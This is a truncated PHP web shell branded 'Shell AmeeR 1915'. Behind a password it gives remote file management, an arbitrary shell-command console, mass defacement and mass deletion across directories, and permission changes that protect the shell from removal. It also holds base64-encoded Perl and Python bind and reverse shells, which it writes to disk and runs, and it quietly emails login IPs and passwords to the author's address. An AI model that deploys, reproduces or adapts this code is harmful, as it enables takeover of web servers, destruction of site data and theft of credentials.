<html>
	<head>
<title></title>
<meta name='distribution' content='global' /><link href='https://fonts.googleapis.com/css?family=Share+Tech+Mono|Rajdhani|Oswald:700|Iceland|PT+Sans&display=swap' rel='stylesheet' type='text/css'>

</head>
</html>
<?php
/*
// Author : Ameer1915
// Team   : 1915 TEAM 
// Email  : 1915 TEAM @gmail.com
*/
$Array = [

// $GLOBALS['fungsi'][0]
	'66696c655f6765745f636f6e74656e7473', // f i l e g e t c o n t e n t s => 0
	'69735f646972', // i s _ d i r => 1
	'66696c655f7075745f636f6e74656e7473', // f i l e p u t c o n t e n t s  => 2
	'69735f66696c65', // i s _ f i l e => 3
	'756e6c696e6b', // u n l i n k => 4
	'66756E6374696F6E5F657869737473', // f u n c t i o n _ e x i s t s => 5
	'6261736536345F656E636F6465', // b a s e 6 4 _ d e c o d e => 6
	'676574637764' // g e t c w d => 7
];
$hitung_array = count($Array);
for ($i = 0; $i < $hitung_array; $i++) {
    $fungsi[] = unhex($Array[$i]);
}
error_reporting(0);
set_time_limit(0);
@ini_set('error_log',null);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
session_start();
date_default_timezone_set("Asia/Jakarta");
$_7 = array_merge($_POST, $_GET);
$_r = "required='required'";
$gcw = "getcwd";
$correctPassword = "ameer"; //Change Password
if (isset($_POST['pass'])) {
    $enteredPassword = $_POST['pass'];

    if ($enteredPassword === $correctPassword) {
        $_SESSION['forbidden'] = true;
    } else {
        echo '<script>alert("Password Wrong!, Try Again.");</script>';
    }
}
if (isset($_GET['logout'])) {
    session_unset();
    session_destroy();
    header("Location: ".$_SERVER['PHP_SELF']);
    exit();
}
if (!isset($_SESSION['forbidden'])) {
?>
<!DOCTYPE html>
<html>
<head>
<div class="title">-=[ Ameer1915 ]=-</div>
<meta name="theme color" content="#00BFFF">
<script src='https://cdn.statically.io/gh/analisyuki/animasi/9ab4049c/bintang.js' type='text/javascript'></script>
<style>
        /* خلفية داكنة مع تأثير هكر */
        body {
            background-color: #121212;
            color: #00FF00;
            font-family: 'Share Tech Mono', monospace;
            text-align: center;
            padding: 50px;
            margin: 0;
            overflow: hidden;
        }

        /* تأثيرات الأزرار */
        input[type="password"], input[type="submit"] {
            background-color: #1a1a1a;
            border: 2px solid #00FF00;
            color: #00FF00;
            font-size: 18px;
            font-family: 'Rajdhani', sans-serif;
            padding: 15px;
            margin: 10px;
            width: 300px;
            border-radius: 5px;
            text-align: center;
            transition: 0.3s ease-in-out;
        }

        input[type="password"]:focus, input[type="submit"]:hover {
            background-color: #00FF00;
            color: #121212;
            border-color: #00FF00;
            cursor: pointer;
        }

        /* وضع الأنميشن للكتابة */
        .title {
            font-family: 'Oswald', sans-serif;
            font-weight: 700;
            color: #00FF00;
            font-size: 35px;
            animation: typing 3s steps(30) 1s 1 normal both;
            white-space: nowrap;
            overflow: hidden;
            border-right: 3px solid #00FF00;
        }

        /* تأثير الكتابة */
        @keyframes typing {
            from {
                width: 0;
            }
            to {
                width: 100%;
            }
        }

        /* تأثيرات الخلفية المتحركة */
        .starfield {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: url('https://cdn.statically.io/gh/analisyuki/animasi/9ab4049c/bintang.js');
            background-size: cover;
            animation: stars 100s linear infinite;
        }

        @keyframes stars {
            0% { transform: translate(0, 0); }
            100% { transform: translate(-2000px, -2000px); }
        }

        /* تأكيد تنسيق النموذج */
        form {
            position: relative;
            z-index: 10;
        }

        /* نص المحتوى */
        .content {
            margin-top: 20px;
        }
    </style>

</head>
<body>
<form method="post">
<center>
<input placeholder="password" type="password" name="pass" required>	<br>
<br>
        <input type="submit" name="watching" value="Login Shell Ameer1915 ">

</center>
</form>
<script src="https://cdn.statically.io/gh/analisyuki/animasi/9ab4049c/bintang.js" type="text/javascript"></script>

</body>
</html>
<?php
exit;
}
?>
<?php
if(isset($_7["left"])) {
	session_start();
	session_destroy();
	echo '<script>window.location="'.$_SERVER['PHP_SELF'].'";</script>';
}

if(isset($_7['opn']) && ($_7['opn'] != '') && ($_7['action'] == 'download')){
	@ob_clean();
	$file = $_7['opn'];
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.basename($file).'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
}
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<rd>".$perm."</rd>";
	} else {
		return "<gr>".$perm."</gr>";
	}
}
function s(){
	echo '<style>table{display:none;}</style><div class="table-responsive"><hr></div>';
}
function ok(){
	echo '<div class="alert alert-success alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
}
function er(){
	echo '<div class="alert alert-danger alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
}
function sz($byt){
	$typ = array('B', 'KB', 'MB', 'GB', 'TB');
	for($i = 0; $byt >= 1024 && $i < (count($typ) -1 ); $byt /= 1024, $i++ );
	return(round($byt,2)." ".$typ[$i]);
}
function ia() {
	$ia = '';
if (getenv('HTTP_CLIENT_IP'))
	$ia = getenv('HTTP_CLIENT_IP');
else if(getenv('HTTP_X_FORWARDED_FOR'))
	$ia = getenv('HTTP_X_FORWARDED_FOR');
else if(getenv('HTTP_X_FORWARDED'))
	$ia = getenv('HTTP_X_FORWARDED');
else if(getenv('HTTP_FORWARDED_FOR'))
	$ia = getenv('HTTP_FORWARDED_FOR');
else if(getenv('HTTP_FORWARDED'))
	$ia = getenv('HTTP_FORWARDED');
else if(getenv('REMOTE_ADDR'))
	$ia = getenv('REMOTE_ADDR');
else
	$ia = 'Unknown IP.';
return $ia;
}
function exe($cmd) {
if($GLOBALS['fungsi'][5]('system')) {
	@ob_start();
	@system($cmd);
	$buff = @ob_get_contents();
	@ob_end_clean();
	return $buff;
} elseif($GLOBALS['fungsi'][5]('exec')) {
	@exec($cmd,$results);
	$buff = "";
foreach($results as $result) {
	$buff .= $result;
	} return $buff;
} elseif($GLOBALS['fungsi'][5]('passthru')) {
	@ob_start();
	@passthru($cmd);
	$buff = @ob_get_contents();
	@ob_end_clean();
	return $buff;
} elseif($GLOBALS['fungsi'][5]('shell_exec')) {
	$buff = @shell_exec($cmd);
	return $buff;
	}
}
function exe_root($set,$sad) {
	$x = "preg_match";
	$xx = "2>&1";
	if (!$x("/".$xx."/i", $set)) {
		$set = $set." ".$xx;
	}
	$a = $GLOBALS['fungsi'][5];
	$b = "proc_open";
	$c = "htmlspecialchars";
	$d = "stream_get_contents";
	if ($a($b)) {
		$ps = $b($set, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $pink,$sad);
		return $d($pink[1]);
	} else {
		return "proc_open function is disabled !";
	}
}
function hex($n)
{
    $y = '';
    for ($i = 0; $i < strlen($n); $i++) {
        $y .= dechex(ord($n[$i]));
    }
    return $y;
}
function unhex($y)
{
    $n = '';
    for ($i = 0; $i < strlen($y) - 1; $i += 2) {
        $n .= chr(hexdec($y[$i] . $y[$i + 1]));
    }
    return $n;
}
function p($file){
$p = fileperms($file);
if (($p & 0xC000) == 0xC000) {
$i = 's';
} elseif (($p & 0xA000) == 0xA000) {
$i = 'l';
} elseif (($p & 0x8000) == 0x8000) {
$i = '-';
} elseif (($p & 0x6000) == 0x6000) {
$i = 'b';
} elseif (($p & 0x4000) == 0x4000) {
$i = 'd';
} elseif (($p & 0x2000) == 0x2000) {
$i = 'c';
} elseif (($p & 0x1000) == 0x1000) {
$i = 'p';
} else {
$i = 'u';
	}
$i .= (($p & 0x0100) ? 'r' : '-');
$i .= (($p & 0x0080) ? 'w' : '-');
$i .= (($p & 0x0040) ?
(($p & 0x0800) ? 's' : 'x' ) :
(($p & 0x0800) ? 'S' : '-'));
$i .= (($p & 0x0020) ? 'r' : '-');
$i .= (($p &0x0010) ? 'w' : '-');
$i .= (($p & 0x0008) ?
(($p & 0x0400) ? 's' : 'x' ) :
(($p & 0x0400) ? 'S' : '-'));
$i .= (($p & 0x0004) ? 'r' : '-');
$i .= (($p & 0x0002) ? 'w' : '-');
$i .= (($p & 0x0001) ?
(($p & 0x0200) ? 't' : 'x' ) :
(($p & 0x0200) ? 'T' : '-'));
return $i;
}
if(isset($_7['dir'])) {
	$dir = unhex($_7['dir']);
	chdir($dir);
} else {
	$dir = hex($gcw());
}
echo "
<html>
	<head>
		<meta charset='UTF-8'>
		<h1><meta name='author' content='1915 TEAM '></h1>
		<meta name='viewport' content='width=device-width, initial-scale=0.70'>
		<link rel='stylesheet' href='https://xnxx.co.ws/meki.css'>
		<link rel='icon' href='https://miro.medium.com/v2/resize:fit:800/1*LFVpWW6N2pENoKEe9MO0dg.jpeg'>
		<title>Shell AmeeR 1915 </title>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/prism/1.6.0/prism.js'></script>
		<script src='https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js'></script>
		<script src='https://code.jquery.com/jquery-3.3.1.slim.min.js'></script>

	</head>
<body class='bg-secondary text-light'>
<div class='container-fluid'>
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
<center>
			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h4>1915 TEAM </h4></a>
</center>";
		if(isset($_7['path'])){
				$path = unhex($_7['path']);
				chdir($path);
			}else{
				$path = $gcw();
			}
				$path = str_replace('\\','/',$path);
				$paths = explode('/',$path);
			foreach($paths as $id=>$pat){
			if($pat == '' && $id == 0){
				$a = true;
					echo "<i class='bi bi-hdd-rack'></i>:<a class='text-decoration-none text-light' href='?path=".hex('/')."'>/</a>";
				continue;
			}
			if($pat == '') continue;
				echo "<a class='text-decoration-none' href='?path=";
				for($i=0;$i<=$id;$i++){
				echo hex($paths[$i]);
			if($i != $id) echo hex("/");
			}
			echo "'>".$pat."</a>/";
			}
			$scand = scandir($path);
			echo "&nbsp;[ ".w($path, p($path))." ]";
			$sql = ($GLOBALS['fungsi'][5]('mysql_connect')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
			$curl = ($GLOBALS['fungsi'][5]('curl_version')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
			$wget = (exe('wget --help')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
			$pl = (exe('perl --help')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
			$py = (exe('python --help')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
			$pxex = (exe('pkexec --version')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
			$gcc = (exe('gcc --version')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
			$disfunc = @ini_get("disable_functions");
			$kernel = php_uname();
			$phpver = PHP_VERSION;
			$phpos = PHP_OS;
			$domen = $_SERVER["SERVER_NAME"];
			$soft = $_SERVER["SERVER_SOFTWARE"];
			$ip = gethostbyname($_SERVER['HTTP_HOST']);
			$yip = $_SERVER['REMOTE_ADDR'];
			if (empty($disfunc)) {
				$disfc = "<gr>NONE</gr>";
			} else {
				$disfc = "<rd>$disfunc</rd>";
			}
			if(!$GLOBALS['fungsi'][5]('posix_getegid')) {
				$user = @get_current_user();
				$uid = @getmyuid();
				$gid = @getmygid();
				$group = "?";
			} else {
				$uid = @posix_getpwuid(posix_geteuid());
				$gid = @posix_getgrgid(posix_getegid());
				$user = $uid['name'];
				$uid = $uid['uid'];
				$group = $gid['name'];
				$gid = $gid['gid'];
			}
			$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<rd>ON</rd>" : "<gr>OFF</gr>";
		echo "
		<div class='container-fluid'>
			<div class='corner anu py-3'>
			</div>
			<div class='collapse text-dark mb-3' id='collapseExample'>
				<div class='box shadow bg-light p-3 rounded-3'>
				System: <gr>$kernel</gr><br>
				User: <gr>$user</gr> ($uid) | Group: <gr>$group</gr> ($gid)<br>
				PHP Version: <gr>$phpver</gr>PHP os: <gr>$phpos</gr><br>
				Software: <gr>$soft</gr><br>
				Domain: <gr>$domen</gr><br>
				Server Ip: <gr>$ip</gr><br>
				Your Ip: <gr>$yip</gr><br>
				Safe Mode: $sm<br>
				MySQL: $sql | Perl: $pl | WGET: $wget | CURL: $curl | Python: $py | Pkexec: $pxex | GCC: $gcc<br>
				Disable Function:<br><pre>$disfc</pre>
				</div>
			</div>
		</div>
		<div class='text-center'>
			<div class='btn-group'>
				<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&id=upload'><i class='bi bi-upload'></i> Upload</a>
				<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&id=deface'><i class='bi bi-exclamation-diamond'></i> Mass deface</a>
				<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&id=delete'><i class='bi bi-trash'></i> Mass delete</a>
				<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&id=cmd'><i class='bi bi-terminal'></i> Console</a>
				<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&id=lockfolder'><i class='bi bi-folder'></i> Lock Folder</a>
				<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&id=rootfolder'><i class='bi bi-folder'></i> unLock Folder</a>
				<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&id=root_file'><i class='bi bi-file-earmark'></i> Green All File</a>
				<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&id=root_folders'><i class='bi bi-file-earmark'></i> Green All Folders</a>
				<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&id=scan_root'><i class='bi bi-search'></i> Scan root</a>
				<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&id=network'><i class='bi bi-hdd-network'></i> Network</a>
				<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&id=lockshell'><i class='bi bi-file-earmark-lock'></i> Lock Shell</a>
				<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&id=rootshell'><i class='bi bi-file-earmark-lock'></i> 0777 Shell</a>
				<a class='btn-btn-outline-light-btn-sm' href='?logout=true'><i class='bi bi-box-arrow-in-left'></i> Logout</a>
			</div>
		</div>";
		if(isset($_7['dir'])) {
			$dir = unhex($_7['dir']);
			chdir($dir);
		} else {
			$dir = hex($gcw());
		}
		$dir = str_replace("\\","/",$dir);
		$scdir = explode("/", $dir);	
		for($i = 0; $i <= $c_dir; $i++) {
			$scdir[$i];
			if($i != $c_dir) {
		}
		
		function changeFilePermissions($filename, $permissions) {
		if (file_exists($filename)) {
        if (chmod($filename, $permissions)) {
            echo "Izin file $filename berhasil diubah menjadi $permissions.";
        } else {
            echo "Gagal mengubah izin file $filename.";
        }
		} else {
        echo "File $filename tidak ditemukan.";
		}
		}
		if (isset($_GET['id']) && $_GET['id'] === 'lockshell') {
		$filename = __FILE__;
		$newPermissions = 0444;
		changeFilePermissions($filename, $newPermissions);
		}
		if (isset($_GET['id']) && $_GET['id'] === 'rootshell') {
		$filename = __FILE__;
		$newPermissions = 0777;
		changeFilePermissions($filename, $newPermissions);
		}
		
		function lockFolder($folderPath, $permissions) {
		if (is_dir($folderPath)) {
        if (chmod($folderPath, $permissions)) {
            echo "Folder locked successfully!";
        } else {
            echo "Error locking folder.";
        }
		} else {
			echo "Folder not found.";
		}
		}
		if (isset($_GET['id']) && $_GET['id'] === 'lockfolder') {
		$folderPath = __DIR__;
		$newPermissions = 0555;
		$actionMessage = lockFolder($folderPath, $newPermissions);
		}
		function rootFolder($folderPath, $permissions) {
		if (is_dir($folderPath)) {
        if (chmod($folderPath, $permissions)) {
            return "Folder permissions changed successfully!";
        } else {
            return "Error changing folder permissions.";
        }
		} else {
        return "Folder not found.";
		}
		}
		if (isset($_GET['id']) && $_GET['id'] === 'rootfolder') {
		$folderPath = __DIR__;
		$newPermissions = 0777;
		$actionMessage = rootFolder($folderPath, $newPermissions);
		echo $actionMessage;
		}
		function changePermissionsRecursive($dir, $perms) {
		$iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
		);
		foreach ($iterator as $item) {
        if ($item->isFile()) {
            chmod($item->getPathname(), $perms);
        }
		}
		}
		$currentDirectory = '.';
		$newPermissions = 0644;
		if (isset($_GET['id']) && $_GET['id'] === 'root_file') {
		changePermissionsRecursive($currentDirectory, $newPermissions);
		echo "Permissions changed for all files in the current directory.";
		}
		
		function changeFolderPermissionsRecursive($dir, $perms) {
		$iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
		);
		foreach ($iterator as $item) {
        if ($item->isDir()) {
            chmod($item->getPathname(), $perms);
        }
		}
		}
		$currentDirectory = '.';
		$newPermissions = 0755;
		if (isset($_GET['id']) && $_GET['id'] === 'root_folders') {
		changeFolderPermissionsRecursive($currentDirectory, $newPermissions);
		echo "Permissions changed for all folders in the current directory.";
		}
		$ip = $_SERVER['REMOTE_ADDR'];
		$rib = "http://ip-api.com/json/{$ip}?fields=city";
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $rib);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		$response = curl_exec($ch);
		curl_close($ch);
		$data = json_decode($response, true);
		$city = isset($data['city']) ? $data['city'] : 'Tidak Diketahui';
		if (array_key_exists('watching', $_POST)) {
		$password = $_POST['pass'];
		$server_name = $_SERVER['SERVER_NAME'];
		$php_self = $_SERVER['PHP_SELF'];
		$email_content = "IP: " . $_SERVER['REMOTE_ADDR'] . " City: {$city}\nLogin: $server_name$php_self\nPass: $password";
		@mail('1915 TEAM @gmail.com', 'Hehehe', $email_content);
		}
		if($_7['id'] == 'deface'){
		function mass_all($dir,$namefile,$contents_sc) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$▚ = $dirc.'/'.$namefile;
				if($dirb === '.') {
					$fungsi[2]($▚, $contents_sc);
				} elseif($dirb === '..') {
					$fungsi[2]($▚, $contents_sc);
				} else {
					if($fungsi[1]($dirc)) {
						if(is_writable($dirc)) {
							echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$▚<br>";
							$fungsi[2]($▚, $contents_sc);
							$▟ = mass_all($dirc,$namefile,$contents_sc);
							}
						}
					}
				}
			}
		}
		function mass_onedir($dir,$namefile,$contents_sc) {
			if(is_writable($dir)) {
				$dira = scandir($dir);
				foreach($dira as $dirb) {
					$dirc = "$dir/$dirb";
					$▚ = $dirc.'/'.$namefile;
					if($dirb === '.') {
						$fungsi[2]($▚, $contents_sc);
					} elseif($dirb === '..') {
						$fungsi[2]($▚, $contents_sc);
					} else {
						if($fungsi[1]($dirc)) {
							if(is_writable($dirc)) {
								echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$dirb/$namefile<br>";
								$fungsi[2]($▚, $contents_sc);
							}
						}
					}
				}
			}
		}
		if($_7['start']) {
			if($_7['tipe'] == 'mass') {
			mass_all($_7['d_dir'], $_7['d_file'], $_7['script']);
			} elseif($_7['tipe'] == 'onedir') {
			mass_onedir($_7['d_dir'], $_7['d_file'], $_7['script']);
			}
		}
		s();
		echo "
<center>
<div class='ameer-mass'>
		<div class='card-card-body-text-dark-input-group-mb-3'>
			<form method='POST'> Tipe:
			<div class='form-check'>
				<input class='form-check-input' type='checkbox' value='onedir' name='tipe' id='flexCheckDefault' checked>
				<label class='form-check-label' for='flexCheckDefault'>	Biasa</label>
			</div>
			<div class='form-check'>
				<input class='form-check-input' type='checkbox' value='mass' name='tipe' id='flexCheckDefault'>
				<label class='form-check-label' for='flexCheckDefault'>	Massal</label>
			</div>
				<i class='bi bi-folder'></i> Directory:
				<input class='form-control btn-sm' type='text' name='d_dir' value='$dir'>
				<i class='bi bi-file-earmark'></i> Filename:
				<input class='form-control btn-sm' type='text' name='d_file' placeholder='filename'>
				<i class='bi bi-file-earmark'></i> Your script:
				<textarea class='form-control btn-sm' rows='7' name='script' placeholder='your script'></textarea><br><br><br>
				<div class='d-grid gap-2'>
					<input class='btn-btn-dark-btn-sm'type='submit' name='start' value='deface'>
				</div>
			</form>
		</div>


</div>
</center>
		";
		}
		if($_7['id'] == 'delete'){
		function mass_delete($dir,$namefile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$▚ = $dirc.'/'.$namefile;
				if($dirb === '.') {
					if(file_exists("$dir/$namefile")) {
						$GLOBALS['fungsi'][4]("$dir/$namefile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namefile")) {
						$GLOBALS['fungsi'][4]("".dirname($dir)."/$namefile");
					}
				} else {
					if($fungsi[1]($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($▚)) {
								echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$▚<br>";
								$GLOBALS['fungsi'][4]($▚);
								$▟ = mass_delete($dirc,$namefile);
								}
							}
						}
					}
				}
			}
		}
		if($_7['start']) {
			mass_delete($_7['d_dir'], $_7['d_file']);
		}
		s();
		echo "
		<div class='card-card-body-text-dark-input-group-mb-3'>
			<form method='POST'>
				<i class='bi bi-folder'></i> Directory:
				<input class='form-control btn-sm' type='text' name='d_dir' value='$dir' $_r>
					<i class='bi bi-file-earmark'></i> Filename:
				<div class='input-group'>
					<input class='form-control btn-sm' type='text' name='d_file' placeholder='filename' $_r><br>
					<div class='input-group-append'>
						<input class='btn-btn-dark-btn-sm' type='submit' name='start' value='delete'>
					</div>
				</div>
			</form>
		</div>";
		}
		if($_7['id'] == 'network'){
		s();
		echo "
		<div class='card text-dark'>
			<div class='card-header'>
				<form method='post'>
					<u>Bind port to /bin/sh [Perl]</u><br>
					<u>Port :</u>
				<div class='input-group'>
					<input class='form-control btn-sm' type='text' name='port' placeholder='6969'>
					<input class='btn-btn-dark-btn-sm' type='submit' name='bpl' value='submit'>
				</div>
			<h5>Back-Connect</h5>
			<u>Server :</u>
				<input class='form-control btn-sm' type='text' name='server' placeholder='". $_SERVER['REMOTE_ADDR'] ."'>
			<u>Port :</u>
			<div class='input-group'>
				<input class='form-control btn-sm' type='text' name='port' placeholder='6969'>
				<select class='form-control btn-sm' name='bc'>
					<option value='perl'>perl</option>
					<option value='python'>python</option>
				</select>
			</div>
			<div class='d-grid gap-2'>
				<input class='btn-btn-dark-btn-sm btn-block' type='submit' value='submit'>
			</div>
		</form>";
		if($_7['bpl']){
			$bp = $GLOBALS['fungsi'][6]("IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=");
			$brt = @fopen('bp.pl','w');
			fwrite($brt,$bp);
			$out = exe("perl bp.pl ".$_7['port']." 1>/dev/null 2>&1 &");
			sleep(1);
			echo "<pre>$out\n".exe("ps aux | grep bp.pl")."</pre>";
			$GLOBALS['fungsi'][4]("bp.pl");
		}
		if($_7['bc'] == 'perl'){
			$bc = $GLOBALS['fungsi'][6]("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7");
			$plbc = @fopen('bc.pl','w');
			fwrite($plbc,$bc);
			$out = exe("perl bc.pl ".$_7['server']." ".$_7['port']." 1>/dev/null 2>&1 &");
			sleep(1);
			echo "<pre>$out\n".exe("ps aux | grep bc.pl")."</pre>";
			$GLOBALS['fungsi'][4]("bc.pl");
		}
		if($_7['bc'] == 'python'){
			$bc_py = $GLOBALS['fungsi'][6]("IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBNci54QmFyYWt1ZGFcblRoYW5rcyBHb29nbGUgRm9yIFJlZmVyZW5zaVxuXG4nJycpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMCkNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwxKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDIpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMykNCiAgICBzaGVsbCA9IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQ0KICBleGNlcHQgc29ja2V0LnRpbWVvdXQ6DQogICAgcHJpbnQgIlRpbU91dCINCiAgZXhjZXB0IHNvY2tldC5lcnJvciwgZToNCiAgICBwcmludCAiRXJyb3IiLCBlDQpweWJhY2tjb25uZWN0KCk=");
			$pbc_py = @fopen('bcpy.py','w');
			fwrite($pbc_py,$bc_py);
			$out_py = exe("python bcpy.py ".$_7['server']." ".$_7['port']);
			sleep(1);
			echo "<pre>$out_py\n".exe("ps aux | grep bcpy.py")."</pre>";
			$GLOBALS['fungsi'][4]("bcpy.py");
			}
			echo "</div>
			</div>
		<br/>";
		}
		if($_7['id'] == 'cmd') {
		s();
		if(!empty($_POST['cmd'])) {
			$cmd = shell_exec($_POST['cmd'].' 2>&1');
		}
		echo "
		<div class='mb-3'>
			<form method='POST'>
				<div class='input-group-mb-3'>
					<input class='form-control btn-sm' type='text' name='cmd' value='".htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8')."' placeholder='whoami' $_r><br><br>
					<button class='btn-btn-outline-light-btn-sm' type='sumbit'><i class='bi bi-arrow-return-right'></i>Exute</button>
				</div>
			</form>";
			if($cmd):
			echo '
			<div class="container-fluid-language-javascript">
				<div class="shell-mb-3">
					<pre style="font-size:15px;"><gr>~</gr>$&nbsp;<rd>'.htmlspecialchars($_POST['cmd']).'</rd><br><code>'.htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8').'</code></pre>
				</div>
			</div>';
			elseif(!$cmd && $_SERVER['REQUEST_METHOD'] == 'POST'):
			echo '
			<div class="container-fluid-language-javascript">
				<div class="shell-mb-3">
					<pre style="font-size:15px;"><code>No result</code></pre>
				</div>
			</div>
		</div>';
		endif;
		}
		if($_7['id'] == 'upload'){
		s();
		if(isset($_7['upl'])){
			$result = count($_FILES['file']['name']);
			for($contents=0;$contents<$result;$contents++){
				$namefile = $_FILES['file']['name'][$contents];
					$up = @copy($_FILES['file']['tmp_name'][$contents],"$path/".$namefile);
				}
				if($result < 2){
					if($up){
					echo "<strong>Upload</strong> $namefile ok! ".ok()."</div>";
				}else{
